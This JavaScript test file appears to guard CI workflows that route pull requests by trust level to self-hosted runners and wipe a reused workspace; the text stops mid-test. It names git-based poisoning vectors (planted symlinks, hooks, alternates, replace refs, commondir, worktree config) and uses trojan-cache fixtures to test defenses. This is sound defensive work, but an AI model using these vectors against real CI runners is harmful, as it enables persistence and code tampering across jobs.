// Runner-routing regression guards for ci.yml, serve-ab.yml, e2e.yml, and
// the qwen-autofix.yml scan lane.
//
// classify_pr carries the routing logic TWICE — the `runs-on` expression
// (which selects the classify job's own runner) and the `pick_runner` shell
// step (which publishes `ubuntu_runner` for every downstream Linux job). If
// they drift, classify and the Test job land on different pools. These tests
// evaluate BOTH against the same event matrix — including the negative
// associations that must stay hosted — and assert they agree.
//
// test_windows carries a deliberately different policy. A pull_request run
// executes the workflow YAML from the PR's own merge commit, so any trust
// clause a PR can read it can also rewrite. The matrix evaluates the real
// expression text and asserts the only enforceable shape: every pull request
// stays hosted, and only the merge queue, schedule and dispatch reach the
// persistent pool.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { parse } from 'yaml';

const workflowsDir = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
);
const ciDoc = parse(readFileSync(join(workflowsDir, 'ci.yml'), 'utf8'));
const serveAbDoc = parse(
  readFileSync(join(workflowsDir, 'serve-ab.yml'), 'utf8'),
);
const visualsDoc = parse(
  readFileSync(join(workflowsDir, 'web-shell-visuals.yml'), 'utf8'),
);

const TRUSTED = ['OWNER', 'MEMBER', 'COLLABORATOR'];
const ECS = '["self-hosted", "linux", "x64", "ecs-qwen"]';
const HOSTED = '["ubuntu-latest"]';
const WIN_ECS = ['self-hosted', 'Windows', 'X64', 'ecs-win'];
const WIN_HOSTED = ['windows-2022'];

const classifyRunsOn = String(ciDoc.jobs.classify_pr['runs-on']);
const windowsRunsOn = String(ciDoc.jobs.test_windows['runs-on']);
const pickRunner = ciDoc.jobs.classify_pr.steps.find(
  (s) => s.id === 'pick_runner',
);
// The visuals parse and job dereference sit at module load, not inside a
// describe callback: on Node 22 a throw there reports zero failures and
// exits 0, silently darkening every guard below; here the same throw fails
// module load and exits 1.
const visualsCaptureJob = visualsDoc.jobs.capture;
const visualsCaptureRunsOn = String(visualsCaptureJob['runs-on']);

// GitHub expression semantics for the classify runs-on, restricted to the
// routing-relevant inputs: contains(list, '') is false, a missing
// pull_request (merge_group / dispatch) yields '' for both head.repo and
// author_association.
function simulateRunsOn({ ecsDisabled, sameRepo, assoc, mergeGroup }) {
  const trusted = TRUSTED.includes(assoc);
  const ecs = !ecsDisabled && (sameRepo || trusted || mergeGroup);
  return ecs ? ECS : HOSTED;
}

// Evaluates a real `runs-on` expression text with the routing inputs
// substituted, leaving only the &&/||/parenthesis skeleton — which matches
// GitHub's operator semantics closely enough for this fixed shape: both
// return the winning operand, and the winning operand is a fromJSON runner
// label, unwrapped here to the array it names. Any term the substitutions
// do not recognise fails loud, so an edited expression is re-read here
// instead of silently outgrowing the matrix.
function evalRunsOn(expression, { ecsDisabled, eventName, sameRepo, assoc }) {
  const substitutions = [
    [/vars\.MAINTAINER_ECS_RUNNER_DISABLED != 'true'/, String(!ecsDisabled)],
    [
      /github\.event_name == 'merge_group'/,
      String(eventName === 'merge_group'),
    ],
    // Longest term first as a convention; both patterns are quote-anchored
    // (the closing quote is part of each regex), so neither can match
    // inside the other and the substitution order is behaviorally inert.
    [
      /github\.event_name != 'pull_request_review'/,
      String(eventName !== 'pull_request_review'),
    ],
    [
      /github\.event_name != 'pull_request'/,
      String(eventName !== 'pull_request'),
    ],
    [
      /github\.event\.pull_request\.head\.repo\.full_name == github\.repository/,
      String(sameRepo),
    ],
    [
      /contains\(fromJSON\('\["OWNER","MEMBER","COLLABORATOR"\]'\), github\.event\.pull_request\.author_association\)/,
      String(TRUSTED.includes(assoc)),
    ],
    [/github\.repository == 'QwenLM\/qwen-code'/, 'true'],
  ];
  let expr = expression.replace(/^\$\{\{\s*/, '').replace(/\s*\}\}$/, '');
  for (const [term, value] of substitutions) {
    expr = expr.replace(term, value);
  }
  expr = expr.replace(/fromJSON\('(\[[^\]]*\])'\)/g, '$1');
  assert.doesNotMatch(
    expr,
    /github\.|vars\.|contains\(|fromJSON\(/,
    `routing expression carries a term the matrix does not model: ${expr}`,
  );
  const selected = new Function(`return (${expr});`)();
  assert.ok(Array.isArray(selected), `no runner label selected: ${expr}`);
  return selected;
}

// Executes the real pick_runner shell with the same inputs and returns the
// selected runner exactly as CI would publish it.
function runPickRunner({ ecsDisabled, sameRepo, assoc, eventName, dispatch }) {
  const tmp = mkdtempSync(join(tmpdir(), 'pick-runner-'));
  const outputFile = join(tmp, 'github_output');
  const result = spawnSync('bash', ['-c', pickRunner.run], {
    env: {
      SAME_REPO: sameRepo ? 'true' : 'false',
      AUTHOR_ASSOCIATION: assoc,
      ECS_DISABLED: ecsDisabled ? 'true' : '',
      EVENT_NAME: eventName,
      DISPATCH_LINUX_RUNNER: dispatch ?? '',
      GITHUB_OUTPUT: outputFile,
    },
    encoding: 'utf8',
  });
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(result.status, 0, `pick_runner failed: ${result.stderr}`);
  const line = result.stdout
    .split('\n')
    .find((l) => l.startsWith('Selected Linux runner: '));
  assert.ok(line, `no selection in pick_runner output: ${result.stdout}`);
  return line.slice('Selected Linux runner: '.length);
}

// Resolves a host executable by walking PATH. The exec tests below give the
// step a stub-only PATH, and spawnSync resolves the spawned command against
// that CHILD path, so the real bash and scan tools must be pinned by
// absolute path.
function hostToolPath(name) {
  for (const dir of (process.env.PATH ?? '').split(':')) {
    if (!dir) {
      continue;
    }
    const candidate = join(dir, name);
    const stats = statSync(candidate, { throwIfNoEntry: false });
    if (stats && (stats.mode & 0o111) !== 0) {
      return candidate;
    }
  }
  return null;
}

// The fleet's PATH git can be a wrapper that execs $QWEN_CI_REAL_GIT
// (extension-git-client.test.ts honors the same convention): resolve the
// witness git through the indirection, and let wipeGitEnv flow the
// variable into the step's env, or both die with `exec: : not found`
// on a wrapper-env machine.
const realGit = process.env.QWEN_CI_REAL_GIT ?? hostToolPath('git');

function writeStub(dir, name, lines) {
  const file = join(dir, name);
  writeFileSync(file, `${lines.join('\n')}\n`);
  chmodSync(file, 0o755);
}

// Executes the REAL 'Install Playwright Chromium' step under GitHub's
// default bash wrapper as a pool member (RUNNER_ENVIRONMENT=self-hosted),
// so the download-only lane runs. Its external world is stubbed:
// npx/sudo/dnf/yum/ldd are scripts in a stub dir (apt-get joins them on
// the debian-* states), the browser tree is a real tmp ${HOME}, and
// machine state is a file the package-manager stubs write — the same side
// effect a real provision has. machine: 'provisioned' — every library
// resolves before the first scan; 'provisionable' — the first scan finds
// missing libraries and dnf fixes them; 'unprovisionable' — nothing
// resolves and dnf/yum both fail; 'debian-provisioned' /
// 'debian-provisionable' — a pool member that ships apt-get, fully
// provisioned / fixed through the apt arm; 'no-browser' — the install
// leaves no browser tree for the scan to find; 'planted-trojan' — a
// previous job left a marker-complete trojan in the shared cache;
// 'planted-stale-elf' — a previous job left an unregistered binary with
// a fabricated DT_NEEDED under a stale version dir.
function runInstallStep(machine) {
  const install = visualsCaptureJob.steps.find(
    (s) => s.name === 'Install Playwright Chromium',
  );
  assert.ok(install, 'the Playwright install step must exist');
  const bashPath = hostToolPath('bash');
  assert.ok(bashPath, 'bash must be resolvable to execute the step');
  const root = mkdtempSync(join(tmpdir(), 'visuals-install-'));
  try {
    const stubDir = join(root, 'stubs');
    const binDir = join(root, 'bin');
    const stubState = join(root, 'stub-state');
    for (const dir of [stubDir, binDir, stubState]) {
      mkdirSync(dir);
    }
    // rm/mkdir/chmod join the pinned set because the step's provenance
    // wipe and the npx stub's re-download both need them.
    for (const tool of ['grep', 'sort', 'find', 'rm', 'mkdir', 'chmod']) {
      const toolPath = hostToolPath(tool);
      assert.ok(toolPath, `${tool} must be resolvable for the scan pipeline`);
      symlinkSync(toolPath, join(binDir, tool));
    }
    writeStub(stubDir, 'npx', [
      '#!/bin/sh',
      'printf \'npx %s\\n\' "$*" >> "$STUB_DIR/calls.log"',
      // Models the real installer's trust in the cache: an
      // INSTALLATION_COMPLETE marker skips the download entirely (the
      // trojan plant's shield); without one the browser tree is
      // re-downloaded and recreated. STUB_INSTALL_RESULT=empty models
      // an install that leaves no tree behind.
      'case "$* " in',
      '  *"playwright install"*)',
      '    if [ "${STUB_INSTALL_RESULT:-ok}" = "empty" ]; then exit 0; fi',
      '    if [ -f "$STUB_BROWSER_CACHE/chromium-1187/INSTALLATION_COMPLETE" ]; then exit 0; fi',
      '    rm -rf "$STUB_BROWSER_CACHE/chromium-1187"',
      '    mkdir -p "$STUB_BROWSER_CACHE/chromium-1187"',
      '    for bin in headless_shell chrome; do',
      '      printf \'#!/bin/sh\\n\' > "$STUB_BROWSER_CACHE/chromium-1187/${bin}"',
      '      chmod 755 "$STUB_BROWSER_CACHE/chromium-1187/${bin}"',
      '    done',
      '    ;;',
      'esac',
    ]);
    writeStub(stubDir, 'sudo', [
      '#!/bin/sh',
      'printf \'sudo %s\\n\' "$*" >> "$STUB_DIR/calls.log"',
      'while [ $# -gt 0 ]; do case "$1" in -*) shift ;; *) break ;; esac; done',
      'exec "$@"',
    ]);
    // apt-get joins the stub set only on the Debian-family states: real
    // RHEL pool members do not ship it, and a stubbed one would win the
    // apt arm before dnf.
    const packageManagers = machine.startsWith('debian')
      ? ['apt-get', 'dnf', 'yum']
      : ['dnf', 'yum'];
    for (const tool of packageManagers) {
      writeStub(stubDir, tool, [
        '#!/bin/sh',
        `printf '${tool} %s\\n' "$*" >> "$STUB_DIR/calls.log"`,
        '[ "$STUB_PROVISION" = ok ] || exit 1',
        'printf \'provisioned\\n\' > "$STUB_DIR/state"',
      ]);
    }
    writeStub(stubDir, 'ldd', [
      '#!/bin/sh',
      // A stale plant under an *-evil* path carries a fabricated
      // DT_NEEDED; a trojaned binary carries the TROJAN marker. Record
      // when the scan feeds on either so the fixtures see what the gate
      // consumed.
      'case "$1" in *-evil/*) printf \'evil-scanned\\n\' >> "$STUB_DIR/calls.log"; printf \'\\tlibplant.so.1 => not found\\n\'; exit 0 ;; esac',
      'grep -q TROJAN "$1" 2>/dev/null && printf \'trojan-scanned\\n\' >> "$STUB_DIR/calls.log"',
      "state=''",
      '[ -f "$STUB_DIR/state" ] && read -r state < "$STUB_DIR/state"',
      '[ "$state" = provisioned ] && exit 0',
      // A distinct missing lib per binary name keeps each arm of the
      // workflow's find provably scanned: dropping an arm drops its line.
      "case \"$1\" in *headless_shell*) printf '\\tlibatk-1.0.so.0 => not found\\n' ;; *chrome*) printf '\\tlibnss3.so => not found\\n' ;; esac",
    ]);
    const fakeHome = join(root, 'home');
    if (machine !== 'no-browser') {
      const browserDir = join(
        fakeHome,
        '.cache',
        'ms-playwright',
        'chromium-1187',
      );
      mkdirSync(browserDir, { recursive: true });
      for (const bin of ['headless_shell', 'chrome']) {
        const file = join(browserDir, bin);
        writeFileSync(file, '#!/bin/sh\n');
        chmodSync(file, 0o755);
      }
      if (machine === 'planted-trojan') {
        // A marker-complete trojan: the real installer trusts the marker
        // and skips the download, leaving the plant byte-identical.
        writeFileSync(join(browserDir, 'chrome'), '#!/bin/sh\n# TROJAN\n');
        chmodSync(join(browserDir, 'chrome'), 0o755);
        writeFileSync(join(browserDir, 'INSTALLATION_COMPLETE'), '');
      }
      if (machine === 'planted-stale-elf') {
        // An unregistered version dir carrying one binary whose DT_NEEDED
        // never resolves (the ldd stub models it for *-evil* paths).
        const evilDir = join(
          fakeHome,
          '.cache',
          'ms-playwright',
          'chromium-9999-evil',
        );
        mkdirSync(evilDir);
        writeFileSync(join(evilDir, 'chrome'), '# PLANTED\n');
        chmodSync(join(evilDir, 'chrome'), 0o755);
      }
    }
    if (
      machine === 'provisioned' ||
      machine === 'debian-provisioned' ||
      machine === 'planted-trojan' ||
      machine === 'planted-stale-elf'
    ) {
      writeFileSync(join(stubState, 'state'), 'provisioned\n');
    }
    const result = spawnSync(
      bashPath,
      ['--noprofile', '--norc', '-eo', 'pipefail', '-c', install.run],
      {
        env: {
          PATH: `${stubDir}:${binDir}`,
          HOME: fakeHome,
          RUNNER_ENVIRONMENT: 'self-hosted',
          STUB_DIR: stubState,
          STUB_BROWSER_CACHE: join(fakeHome, '.cache', 'ms-playwright'),
          STUB_INSTALL_RESULT: machine === 'no-browser' ? 'empty' : 'ok',
          STUB_PROVISION:
            machine === 'provisionable' || machine === 'debian-provisionable'
              ? 'ok'
              : 'fail',
        },
        encoding: 'utf8',
      },
    );
    const callsFile = join(stubState, 'calls.log');
    const calls = existsSync(callsFile) ? readFileSync(callsFile, 'utf8') : '';
    return {
      status: result.status,
      stdout: result.stdout,
      stderr: result.stderr,
      calls,
    };
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// Allowlists only the exact `secrets.GITHUB_TOKEN` reference by flagging
// EVERY occurrence of the secrets context: dot, bracket/indexed, and
// whole-context forms all reach ambient secrets, so enumerating
// expression shapes one at a time leaves the class open. Fails closed —
// any occurrence that is not literally the permitted reference throws.
function assertSecretFree(where, value) {
  const refs =
    String(value ?? '').match(/\bsecrets\b\s*(?:\.[A-Za-z_]+|\[[^\]]*\])?/g) ??
    [];
  for (const ref of refs) {
    assert.equal(
      ref.replace(/\s+/g, ''),
      'secrets.GITHUB_TOKEN',
      `capture ${where} references ${ref}; the render side must stay secret-free`,
    );
  }
}

// Shared env for the wipe exec witnesses: the step's git calls must read
// no config outside the fixture, so HOME is a fresh dir per fixture and
// system config is off.
function wipeGitEnv(home) {
  return {
    PATH: process.env.PATH,
    HOME: home,
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_AUTHOR_NAME: 'wipe-probe',
    GIT_AUTHOR_EMAIL: 'wipe-probe@example.com',
    GIT_COMMITTER_NAME: 'wipe-probe',
    GIT_COMMITTER_EMAIL: 'wipe-probe@example.com',
    // The wrapper's indirection variable must reach the child env, or
    // its `exec "$QWEN_CI_REAL_GIT"` dies on an empty value.
    ...(process.env.QWEN_CI_REAL_GIT
      ? { QWEN_CI_REAL_GIT: process.env.QWEN_CI_REAL_GIT }
      : {}),
  };
}

// Runs git inside a wipe witness fixture and fails loud on any error, so a
// broken plant reads as a broken test, not as a vacuous one.
function gitProbe(home, args, cwd) {
  const res = spawnSync(realGit, args, {
    cwd,
    encoding: 'utf8',
    env: wipeGitEnv(home),
  });
  assert.equal(res.status, 0, `git ${args.join(' ')} failed: ${res.stderr}`);
  return res.stdout.trim();
}

function initProbeRepo(home, dir) {
  mkdirSync(dir, { recursive: true });
  gitProbe(home, ['init', '-q', '-b', 'main', dir]);
  gitProbe(home, ['commit', '-q', '--allow-empty', '-m', 'init'], dir);
}

// Executes the REAL wipe step under GitHub's default bash wrapper with the
// runner env it reads, against a fixture workspace the caller planted.
function runWipeStep(runText, { home, ws, rws }) {
  const bashPath = hostToolPath('bash');
  assert.ok(bashPath, 'bash must be resolvable to execute the wipe step');
  assert.ok(realGit, 'git must be resolvable to execute the wipe step');
  // GitHub Actions starts the step with its CWD in GITHUB_WORKSPACE, so
  // the harness does too — a symlinked path opens the link's target as the
  // CWD, exactly the shape the step must contain. A missing or
  // non-directory workspace pins the parent instead.
  let cwd = ws;
  for (;;) {
    try {
      if (statSync(cwd).isDirectory()) {
        break;
      }
    } catch {
      // resolve-through failures and missing paths climb alike
    }
    const parent = dirname(cwd);
    if (parent === cwd) {
      break;
    }
    cwd = parent;
  }
  return spawnSync(
    bashPath,
    ['--noprofile', '--norc', '-eo', 'pipefail', '-c', runText],
    {
      cwd,
      encoding: 'utf8',
      // A regression of the relative-RWS guard spins the ancestor walk
      // forever; kill it so the witness turns red instead of hanging.
      timeout: 15000,
      env: {
        ...wipeGitEnv(home),
        GITHUB_WORKSPACE: ws,
        RUNNER_WORKSPACE: rws,
      },
    },
  );
}

const ASSOCIATIONS = [
  ...TRUSTED,
  'CONTRIBUTOR',
  'FIRST_TIME_CONTRIBUTOR',
  'FIRST_TIMER',
  'NONE',
  '',
];

describe('ci.yml classify_pr runner routing', () => {
  it('the expression and the shell step agree on every association', () => {
    for (const sameRepo of [true, false]) {
      for (const assoc of ASSOCIATIONS) {
        const expected = simulateRunsOn({
          ecsDisabled: false,
          sameRepo,
          assoc,
          mergeGroup: false,
        });
        const actual = runPickRunner({
          ecsDisabled: false,
          sameRepo,
          assoc,
          eventName: 'pull_request',
        });
        assert.equal(
          actual,
          expected,
          `drift for sameRepo=${sameRepo} assoc='${assoc}'`,
        );
      }
    }
  });

  it('only write-access associations leave the hosted pool', () => {
    for (const assoc of ['CONTRIBUTOR', 'FIRST_TIME_CONTRIBUTOR', 'NONE', '']) {
      assert.equal(
        runPickRunner({
          ecsDisabled: false,
          sameRepo: false,
          assoc,
          eventName: 'pull_request',
        }),
        HOSTED,
        `assoc '${assoc}' must stay hosted`,
      );
    }
    for (const assoc of TRUSTED) {
      assert.equal(
        runPickRunner({
          ecsDisabled: false,
          sameRepo: false,
          assoc,
          eventName: 'pull_request',
        }),
        ECS,
        `assoc '${assoc}' must route to ECS`,
      );
    }
  });

  it('merge queue and explicit dispatch still reach ECS; the kill-switch wins', () => {
    assert.equal(
      runPickRunner({
        ecsDisabled: false,
        sameRepo: false,
        assoc: '',
        eventName: 'merge_group',
      }),
      ECS,
    );
    assert.equal(
      runPickRunner({
        ecsDisabled: false,
        sameRepo: false,
        assoc: '',
        eventName: 'workflow_dispatch',
        dispatch: 'self-hosted',
      }),
      ECS,
    );
    assert.equal(
      runPickRunner({
        ecsDisabled: true,
        sameRepo: true,
        assoc: 'OWNER',
        eventName: 'pull_request',
      }),
      HOSTED,
      'kill-switch must revert even trusted runs to hosted',
    );
  });

  it('the runs-on expression keeps the trusted clause and kill-switch', () => {
    // Structural pins for the expression half of the drift guard — the
    // simulation above re-implements it, so pin the real text too.
    assert.match(
      classifyRunsOn,
      /contains\(fromJSON\('\["OWNER","MEMBER","COLLABORATOR"\]'\), github\.event\.pull_request\.author_association\)/,
    );
    assert.match(
      classifyRunsOn,
      /vars\.MAINTAINER_ECS_RUNNER_DISABLED != 'true'/,
    );
    assert.match(classifyRunsOn, /github\.event_name == 'merge_group'/);
  });
});

describe('ci.yml test_windows runner routing', () => {
  it('keeps every pull request hosted, whoever opens it', () => {
    // A pull_request run executes the workflow YAML from the PR's own merge
    // commit: any PR this lane admits could rewrite `runs-on` in the same
    // diff (editing this file is what classifies it platform-sensitive), so
    // no trust clause evaluated on that event is enforceable. The enforceable
    // shape is unconditional — pull requests never reach the persistent pool.
    for (const sameRepo of [true, false]) {
      for (const assoc of ASSOCIATIONS) {
        assert.deepEqual(
          evalRunsOn(windowsRunsOn, {
            ecsDisabled: false,
            eventName: 'pull_request',
            sameRepo,
            assoc,
          }),
          WIN_HOSTED,
          `pull_request sameRepo=${sameRepo} assoc='${assoc}' must stay hosted`,
        );
      }
    }
  });

  it('keeps the pool for every non-pull-request trigger', () => {
    // The denial form exists so the queue, the nightly and dispatch runs stay
    // on the pool without a pull_request context to read; an && / || flip in
    // the gate must not exile them to hosted runners.
    for (const eventName of ['merge_group', 'schedule', 'workflow_dispatch']) {
      assert.deepEqual(
        evalRunsOn(windowsRunsOn, {
          ecsDisabled: false,
          eventName,
          sameRepo: false,
          assoc: '',
        }),
        WIN_ECS,
        `${eventName} must keep the pool`,
      );
    }
  });

  it('the kill-switch wins on every event', () => {
    for (const eventName of [
      'pull_request',
      'merge_group',
      'schedule',
      'workflow_dispatch',
    ]) {
      assert.deepEqual(
        evalRunsOn(windowsRunsOn, {
          ecsDisabled: true,
          eventName,
          sameRepo: true,
          assoc: 'OWNER',
        }),
        WIN_HOSTED,
        `kill-switch must win on ${eventName}`,
      );
    }
  });
});

describe('serve-ab.yml runner routing', () => {
  const runsOn = String(serveAbDoc.jobs.ab['runs-on']);

  it('admits same-repo and write-access fork PRs, guarded by the kill-switch', () => {
    assert.match(runsOn, /head\.repo\.full_name == github\.repository/);
    assert.match(
      runsOn,
      /contains\(fromJSON\('\["OWNER","MEMBER","COLLABORATOR"\]'\), github\.event\.pull_request\.author_association\)/,
    );
    assert.match(runsOn, /vars\.MAINTAINER_ECS_RUNNER_DISABLED != 'true'/);
    assert.match(runsOn, /ecs-qwen/);
    assert.match(runsOn, /ubuntu-latest/);
  });

  it('wipes the reused workspace except the shared root .git before checking out PR code', () => {
    const steps = serveAbDoc.jobs.ab.steps;
    const wipeIndex = steps.findIndex(
      (s) =>
        s.name ===
        'Wipe stale workspace except the shared .git before checkout',
    );
    assert.ok(
      wipeIndex !== -1,
      'self-hosted reuse must not bleed one PR into the next',
    );
    const wipe = steps[wipeIndex];
    assert.equal(wipe.if, "${{ runner.environment == 'self-hosted' }}");
    // The script text alone does not decide whether the wipe runs: the
    // shell wrapper, continue-on-error (step and job level), and env
    // overrides (BASH_ENV, PATH, GITHUB_WORKSPACE) — at step, job, and
    // workflow level — all control whether the pinned command executes
    // and whether its failure fails the job.
    const shell =
      wipe.shell ??
      serveAbDoc.jobs.ab.defaults?.run?.shell ??
      serveAbDoc.defaults?.run?.shell;
    assert.ok(
      shell === undefined || shell === 'bash',
      'the wipe must run under the default bash wrapper',
    );
    assert.ok(
      !('continue-on-error' in wipe),
      'a failed wipe must fail the job, not bleed into the next PR',
    );
    assert.ok(
      !('continue-on-error' in serveAbDoc.jobs.ab),
      'a job-level continue-on-error would mask a failed wipe',
    );
    for (const envMap of [wipe.env, serveAbDoc.jobs.ab.env, serveAbDoc.env]) {
      assert.ok(
        !envMap ||
          (envMap.BASH_ENV === undefined &&
            envMap.PATH === undefined &&
            envMap.GITHUB_WORKSPACE === undefined),
        'BASH_ENV, PATH, or GITHUB_WORKSPACE can shadow the pinned wipe command',
      );
    }
    // The sudo-less wipe only works because ownership-restore ran first,
    // and it must precede the checkouts or it deletes the freshly
    // checked-out code instead of stale leftovers.
    const stepIndex = (name) => steps.findIndex((s) => s.name === name);
    const ownershipIndex = stepIndex('Restore workspace ownership');
    assert.ok(
      ownershipIndex !== -1,
      'the wipe depends on the ownership-restore step existing',
    );
    assert.match(
      steps[ownershipIndex].run,
      /chown -R .* "\$GITHUB_WORKSPACE"/,
      'ownership-restore must actually chown the workspace',
    );
    assert.ok(
      ownershipIndex < wipeIndex,
      'the wipe depends on ownership-restore running first',
    );
    const checkouts = steps.filter((s) =>
      String(s.uses || '').startsWith('actions/checkout'),
    );
    for (const checkout of checkouts) {
      assert.ok(
        steps.indexOf(checkout) > wipeIndex,
        'the wipe must run before every checkout it protects',
      );
    }
    assert.ok(checkouts.length >= 2, 'expected at least two checkouts');
    // Wiping the shared root .git forces the next job on this runner to
    // re-fetch the full history from github.com — on the ECS pool's slow
    // link that is the "hung runner" pathology. The checkout-heal path
    // guard (#9220, #9265) ahead of it is pinned and exec-verified by
    // scripts/tests/serve-ab-workflow.test.js; here pin that the guard is
    // present and hands off to the kept-.git tail, line by line, so any
    // change forces a deliberate test update.
    assert.match(
      wipe.run,
      /refusing to wipe suspicious workspace path/,
      'the wipe must keep the checkout-heal path guard',
    );
    assert.match(
      wipe.run,
      /::error::refusing to wipe: an ancestor of the runner workspace is a symlink/,
      'the wipe must refuse a runner workspace planted under a symlinked ancestor — realpath would resolve through it and re-root every containment check at the link target',
    );
    assert.match(
      wipe.run,
      /::error::refusing to wipe relative runner workspace path/,
      'a relative runner workspace must fail closed BEFORE the ancestor walk — dirname -- "." outputs ".", so the walk would spin until timeout-minutes kills the job',
    );
    assert.match(
      wipe.run,
      /::warning::healing workspace path .*: it was a symlink/,
      'a symlinked intermediate component must be healed, not refused — a refusal removes nothing and wedges every later job reading the same env',
    );
    const executed = wipe.run
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l !== '' && !l.startsWith('#'));
    assert.equal(executed[0], 'set -uo pipefail');
    const tail = executed.slice(-28);
    assert.equal(
      tail[0],
      'find "$WS" -mindepth 1 -maxdepth 1 ! \\( -name \'.git\' -type d \\) -exec rm -rf {} +',
      'the wipe must keep only a REAL .git directory — a symlink or gitfile named .git can point outside the workspace — and only the guarded $WS may reach the rm',
    );
    assert.equal(
      tail[1],
      'if [ -d "$WS/.git" ]; then',
      'the wholesale validation guards on a real kept repo: a healed-empty workspace has no gitdir to sweep',
    );
    assert.equal(
      tail[2],
      'planted="$(find "$WS/.git" -type l | wc -l | tr -d \' \')"',
      'count the planted symlinks before naming anything — the names are bytes a previous job chose',
    );
    assert.equal(
      tail[3],
      'if [ "${planted}" != "0" ]; then',
      'report and sweep only when something was actually planted',
    );
    assert.equal(
      tail[4],
      'echo "::warning::removing ${planted} planted symlink(s) under ${WS}/.git"',
      'counted, not named: a newline in a planted name would forge a workflow annotation once printed',
    );
    assert.equal(
      tail[5],
      'find "$WS/.git" -type l -delete',
      'every symlink under the kept .git redirects a read or a write through an attacker-chosen target — sweep the class, link only, never following',
    );
    assert.equal(
      tail[6],
      'fi',
      'keep the sweep report an if-block: under -e a one-line && form fails the step when nothing is planted',
    );
    assert.equal(
      tail[7],
      'find "$WS/.git" -name \'*.lock\' -prune -exec rm -rf {} +',
      'every *.lock of any shape — a plant jams the defangs below or the next checkout; rm -rf takes directory-shaped plants too',
    );
    assert.equal(
      tail[8],
      'rm -rf "$WS/.git/objects/info/alternates"',
      'alternates poison the object store the next checkout materializes',
    );
    assert.equal(
      tail[9],
      'fi',
      'keep the wholesale sweep inside the kept-.git guard',
    );
    assert.equal(
      tail[10],
      'rm -rf "$WS/.git/commondir"',
      'the kept .git must lose commondir BEFORE any git call — a plant repoints hooks, config and refs to an attacker gitdir outside the workspace, and rm -rf takes a directory-shaped plant',
    );
    assert.equal(
      tail[11],
      'rm -rf "$WS/.git/hooks" "$WS/.git/info/attributes"',
      'the kept .git must lose its hooks and info/attributes exec vectors',
    );
    assert.equal(
      tail[12],
      'rm -rf "$(git --git-dir="$WS/.git" rev-parse --git-path config.worktree 2>/dev/null || echo /nonexistent)" 2>/dev/null || true',
      "extensions.worktreeConfig activates .git/config.worktree, a second local file that git config --local neither lists nor unsets — delete it like qwen-triage.yml's hardened config-sanitize",
    );
    assert.equal(
      tail[13],
      'git --git-dir="$WS/.git" config --local --unset-all extensions.worktreeConfig 2>/dev/null || true',
      'drop the extension that re-activates the split config file',
    );
    assert.equal(
      tail[14],
      '{ git --git-dir="$WS/.git" config --local --name-only --list 2>/dev/null || true; } | { grep -ivE \'^(core\\.(repositoryformatversion|bare|filemode|symlinks|ignorecase|precomposeunicode|logallrefupdates|hidedotfiles|protecthfs|protectntfs)|remote\\..+\\.(url|fetch|pushurl)|branch\\.|gc\\.|pack\\.|fetch\\.|index\\.|safe\\.|submodule\\.[^.]+\\.(url|active|branch))\' || true; } | while IFS= read -r key; do git --git-dir="$WS/.git" config --local --unset-all "$key" 2>/dev/null || true; done',
      "the kept .git config must be scrubbed to an allowlist that keeps NO extensions.* key — a planted extension makes every later git call exit 128 — remote narrowed to url/fetch/pushurl (any other remote key is a knob: vcs execs git-remote-<vcs> on the next fetch), core.worktree dropped (redirects the next checkout outside the workspace) — anchored to $WS/.git so a healed symlinked root never scrubs the link's target",
    );
    assert.equal(
      tail[15],
      'if [ -d "$WS/.git" ]; then',
      'the replace strip and its fail-open guard on a real kept repo: a healed-empty workspace has no refs to strip and must not fail the job here',
    );
    assert.equal(
      tail[16],
      'if ! replace_refs="$(git --git-dir="$WS/.git" for-each-ref --format=\'%(refname)\' refs/replace 2>/dev/null)"; then',
      'enumerate the replace refs; an unenumerable gitdir cannot be proven clean',
    );
    assert.equal(
      tail[17],
      'echo "::warning::removing kept .git whose refs cannot be enumerated: ${WS}/.git"',
      'the fail-open reports why the reuse is being paid back',
    );
    assert.equal(
      tail[18],
      'rm -rf "$WS/.git"',
      'fail open: remove the unprovable gitdir instead of carrying it — the next job re-fetches',
    );
    assert.equal(tail[19], 'else', 'an enumerable gitdir keeps the strip');
    assert.equal(
      tail[20],
      'printf \'%s\\n\' "${replace_refs}" | while IFS= read -r ref; do',
      "a planted refs/replace entry silently substitutes file content in the next job's checkout (actions/checkout passes no --no-replace-objects) — delete every one through git so packed entries drop too",
    );
    assert.equal(
      tail[21],
      'if [ -n "${ref}" ]; then',
      'an empty enumeration yields one empty line — the loop must skip it without failing the pipe',
    );
    assert.equal(
      tail[22],
      'git --git-dir="$WS/.git" update-ref -d "${ref}"',
      'delete each planted replace ref',
    );
    assert.equal(tail[23], 'fi', 'keep the empty-line skip an if-block');
    assert.equal(tail[24], 'done', 'close the strip loop');
    assert.equal(tail[25], 'fi', 'close the fail-open if/else');
    assert.equal(
      tail[26],
      'fi',
      'the strip and fail-open stay inside the kept-.git guard',
    );
    assert.equal(
      tail[27],
      'rm -rf "$WS/.git/refs/replace"',
      'and remove the namespace itself so nothing under it survives',
    );
  });
});

describe('web-shell-visuals.yml capture runner routing', () => {
  // The capture job builds and renders PR code, so it follows the fleet's
  // trust split exactly as serve-ab does: same-repo PRs and write-access
  // fork authors reach the persistent pool, every other fork PR keeps the
  // ephemeral hosted runner, and the kill-switch forces everything hosted.
  // evalRunsOn unwraps the winning fromJSON label to the array it names.
  const ECS_LABELS = ['self-hosted', 'linux', 'x64', 'ecs-qwen'];
  const HOSTED_LABELS = ['ubuntu-latest'];

  it('routes pull requests by fork trust', () => {
    assert.deepEqual(
      evalRunsOn(visualsCaptureRunsOn, {
        ecsDisabled: false,
        eventName: 'pull_request',
        sameRepo: true,
        assoc: 'NONE',
      }),
      ECS_LABELS,
      'same-repo PRs must render on the pool',
    );
    assert.deepEqual(
      evalRunsOn(visualsCaptureRunsOn, {
        ecsDisabled: false,
        eventName: 'pull_request',
        sameRepo: false,
        assoc: 'MEMBER',
      }),
      ECS_LABELS,
